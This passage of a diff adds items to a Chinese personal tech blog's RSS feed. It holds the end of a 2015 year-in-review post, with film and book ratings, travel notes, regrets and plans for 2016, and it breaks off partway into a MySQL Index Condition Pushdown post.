+&lt;td align=&#34;center&#34;&gt;把很多道理通过一部喜剧讲述出来&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;放牛班的春天&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;教育的重要性&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;龙猫&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;知道故事背景以后想不出低于5分的理由&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;教父1、2（review）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;看完简书上教父深度影评以后，再看果然多了一些味道&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;天堂电影院&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;影迷的&amp;rdquo;情书&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;当幸福来敲门（review）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;如果你有梦想的话，就要去捍卫它。那些一事无成的人想告诉你你也成不了大器。如果你有理想的话，就要去努力实现。就这样。太多太多的经典台词，很鼓舞我。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;搏击俱乐部（review）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;The things you own end up owning you.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;楚门的世界&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;影片有很多硬伤BUG,不过创意，想表述的思想足够遮掩缺点了&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;触不可及&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;感动，友谊不分阶层等级，平等是关键。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;指环王三部曲（review）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;看完以后心里默默的种下了新西兰的草&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;十二怒汉&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;法律的意义&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;窃听风暴&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;人性&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;少年派的奇妙漂流&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;我宁愿相信结尾第一个故事是真的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;美丽人生&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;父爱的伟大&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;上帝之城&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;贫民窟对人性的考验&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;辩护人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;韩国的电影可以的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;夏洛特的烦恼&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;简单的故事，穿插了一些怀旧的因素，打动人心的音乐。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;火影忍者剧场版：博人传&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;青春、热血、羁绊&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;云中行走&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;很激励我，长镜头满分&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;解救吾先生&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;王源、刘烨、华仔的演技-&amp;gt;牛逼&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;滚蛋吧肿瘤君&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;积极乐观的人生观，满满的正能量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;火星救援&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;如果我是男主，深处绝境，我会做什么？可能。。。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;失孤&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;因为是真实的故事，所以更有说服力吧&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;星际穿越&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这画面、创意。属于我喜欢的调调&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;喜剧之王&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;我养你啊。飘飘:&amp;ldquo;看前面一片漆黑,什么也看不到&amp;rdquo;，天仇:&amp;ldquo;也不是啊,天亮后便会很美的.&amp;ldquo;小时候看是喜剧，长大后是悲剧。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;白日梦想家&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;把思想付诸与行动，因为时间过的真TMD太快了。在不行动就老了。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;乱世佳人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;tommor is another day&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;千与千寻&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;一个小女孩的坚强，勇敢，担当&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;机器人总动员&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;对人类未来机器化发展的反思&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;荒野猎人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;剧情一般，小李子拼了。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;烈日灼心&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这电影广电居然批了。。。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;爆裂鼓手&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;黑暗励志系&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;老炮儿&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;侠肝义胆、喜欢这样的故事。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;师父&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;宋佳和廖凡拍的好有味道&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;西游记之大圣归来&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这是国产动画片？难以相信。。。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;闻香识女人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;跳舞那段好酷&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;天使爱美丽&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;电影不错，不过我不喜欢&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;被嫌弃的松子的一生&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;父亲对女儿的心里成长挺重要的，松子一辈子都在取悦别人，结果呢。。。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;小时代4：灵魂尽头&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;反正感动我了&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;我的少女时代&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;有一些触动内心的情节。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;唐人街办案&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;陈思成第一次拍电影，用心了&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;杀破狼2&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;我靠还可以这么打，吴京好帅&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;速度与激情7&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;保罗要是没死，会给1分&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;蚁人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;漫威的作品，谈不上好，也谈不上坏，彩蛋不错&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;复仇者联盟2：奥创纪元&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;漫威的作品，谈不上好，也谈不上坏&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;美人鱼&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;真实评分0分，3分给星爷面子&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;寻龙诀&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;夏雨的演技可以的。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;饥饿游戏3：嘲笑鸟（下）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;拍的跟狗屎似得，给3分是因为前几部光环&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;碟中谍5：神秘国度&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;不管怎样有6的时候还会去再看，全场宝马系列植入&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;末日崩塌&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;自己喜欢的灾难片&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;007：幽灵党&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;老太太过年一年不如一年&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;捉妖记&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;2分给特效&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;侏罗纪世界&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;圈钱的，特效给2分&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;战狼&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;剧情硬伤，不过有吴京在&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;念念&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;伤害自己最深的，却也是自己最深爱的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;剩者为王&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;给1分因为金士杰那段关于父亲对女儿的爱（这段我给满分）&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;前任2：备胎反击战&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这种电影，能笑就是成功&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;港囧&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;可能因为泰囧太成功了，所以落差有些大&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;终结者：创世纪&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;1分给斯瓦辛格，毕竟那么大岁数了，不容易&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;破风&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;挺烂的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;迷城&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;1&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;因为古仔&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;道士下山&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;前半部可以打4分，后半部就是潘金莲与西门庆的故事&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;名侦探柯南：业火的向日葵&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;狗屎&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;宅女侦探桂香&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;狗屎&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;王朝的女人杨贵妃&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;可惜没有马震&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;巴黎假期&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;古仔脑残粉&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;命中注定&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;冲着汤唯去的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;万万没想到&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;圈钱的&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;煎饼侠&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;呵呵&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;栀子花开&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;0&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;给1分是看何炅&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;旅行：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;库不齐沙漠&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.xiaojiong.net/2015/10/14/%E9%9D%92%E5%B2%9B%E6%B8%B8%E8%AE%B0/&#34;&gt;青岛&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;厦门&lt;/li&gt;
+&lt;li&gt;北京胡同&lt;/li&gt;
+&lt;li&gt;灵水村&lt;/li&gt;
+&lt;li&gt;哈尔滨&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;音乐：&lt;a href=&#34;http://music.163.com/#/share/17470949/239988376&#34;&gt;谜小囧的歌单&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;读书：&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;名称&lt;/th&gt;
+&lt;th align=&#34;right&#34;&gt;评分（5分满分）&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;短评&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;技术类&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;高性能Mysql（第三版）&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;经典就是经典&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;UNIX环境高级编程&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;unix环境编程，字典和索引。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;嗨翻C语言&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;语言幽默，通俗易懂。适合初学者&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;C Primer PLus(第五版)&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;c语言有的东西，都讲到了，讲明白了。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;php扩展开发及内核应用&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这个看完就可以自己写扩展了&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;深入理解php内核&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;对于php的内部机制，变量实现等等有了一个新的理解&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;redis源码日志&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;对redis有了更深入的理解&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;git教程&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;公司平时开发SVN，想了解一下git,工具书&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;简明python教程&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;review python&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;vim实用技巧&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;看着玩的工具书&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;非技术类&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;追风筝的人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;对人性的描述，对友情、亲情的描述。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;百年孤独&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;5&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这书看完以后觉得有点没看懂，暂时的理解就是孤独就是重复。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;解忧杂货店&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;4&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;情节设计、剧情转折、人物设定。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;当时忍住就好了&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;学会控制自己的负能量&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;摆渡人&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;3&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;这书的简介太能吹逼，什么堪比指环王，呵呵&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;他们最幸福&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;同《乖，摸摸头》&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;深度学习的艺术&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;有些方法挺好的，有些不太现实&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;无基础健身&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;还行&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;人性的弱点&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;传说中的卡耐基&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;乖，摸摸头&lt;/td&gt;
+&lt;td align=&#34;right&#34;&gt;2&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;以前看觉得故事中的人物好牛逼，现在想想呵呵呵&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;总结：挺惊讶自己居然有这么多的时间看了这么多的电影。至于旅行，除了黄山没去，基本上想去的地方都去了。音乐上开始喜欢民谣，喜欢有故事的音乐，干净的纯粹的音乐。读书上杂书看的有点略多，有些书籍看的不仔细，2016应该进行review。2016希望自己看书看的慢一点，细一点。不求数量，但求质量。&lt;/p&gt;
+
+&lt;p&gt;###2015年遗憾
+ * 学习PPT
+ * 自从14年看过英文版的小王子之后，说好每年看一本英文小说的。这个对自己的承诺被狗吃了。。。
+ * 想用C写一个1942（飞机大战）
+ * 想去爬山（黄山不错）
+ * 跑一场马拉松
+ * 没好好利用买来的mac
+ * 好多想看的书没看
+ * 没有长高
+ * 技术上的成长没有达到预期
+ * 没有好好学习尤克里里
+ * 想写一个工具
+ * 不跟老爸顶嘴
+ * 少说&lt;/p&gt;
+
+&lt;p&gt;###2016年希望
+ * 好好执行2016年计划
+ * 完成2015年的遗憾
+ * 想当架构师，希望今年能通过自己的努力离梦想更近一些
+ * 做事情成熟点，和朋友幼稚点
+ * 坚持之前坚持的
+ * 珍惜时间、珍惜时间、珍惜时间（重要的事情说三遍）&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>mysql Index Condition Pushdown</title>
+      <link>http://xiaojiong.net/2016/02/18/mysql-index-condition-pushdown/</link>
+      <pubDate>Thu, 18 Feb 2016 14:36:47 +0800</pubDate>
+      
+      <guid>http://xiaojiong.net/2016/02/18/mysql-index-condition-pushdown/</guid>
+      <description>
+
+&lt;p&gt;从mysql5.6开始引入一个重要的优化，就是Index Condition Pushdown(ICP)&lt;/p&gt;
+
+&lt;h3 id=&#34;什么是icp&#34;&gt;什么是ICP&lt;/h3&gt;
+
+&lt;p&gt;Index Condition Pushdown(ICP)是MySQL用索引去表里取数据的一种优化。如果禁用ICP，引擎层会穿过索引在基表中寻找数据行，然后返回给MySQL Server层，再去为这些数据行进行WHERE后的条件的过滤。ICP启用，如果部分WHERE条件能使用索引中的字段，MySQL Server 会把这部分下推到引擎层。存储引擎通过使用索引条目，然后推索引条件进行评估，使用这个索引把满足的行从表中读取出。ICP能减少引擎层访问基表的次数和MySQL Server访问存储引擎的次数。总之是ICP的优化在引擎层就能够过滤掉大量的数据，这样无疑能够减少了对base table和mysql server的访问次数。&lt;/p&gt;
+
+&lt;h3 id=&#34;icp图解&#34;&gt;ICP图解&lt;/h3&gt;
+
+&lt;p&gt;没有ICP之前：
+where条件-&amp;gt;index索引-&amp;gt;table filter（mysql_server）
+&lt;img src=&#34;http://ww1.sinaimg.cn/mw690/68faff51gw1f13fxanouvj20df0camz5.jpg&#34; alt=&#34;ICP之前&#34; /&gt;
+ICP之后：
+where条件-&amp;gt;index索引-&amp;gt;index filter-&amp;gt;table filter(mysql_server)
+&lt;img src=&#34;http://ww1.sinaimg.cn/mw690/68faff51gw1f13fxanouvj20df0camz5.jpg&#34; alt=&#34;ICP之后&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;数据库&#34;&gt;数据库&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://launchpad.net/test-db/employees-db-1/1.0.6/+download/employees_db-full-1.0.6.tar.bz2&#34;&gt;示例数据库下载地址&lt;/a&gt;
+employees的数据库如下:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SHOW TABLES;
++---------------------+
+| Tables_in_employees |
++---------------------+
+| departments         |
+| dept_emp            |
+| dept_manager        |
+| employees           |
+| salaries            |
+| titles              |
++---------------------+
+6 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;employees表结构如下:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mysql&amp;gt; show create table employees;
+-------------------------------------------------------+
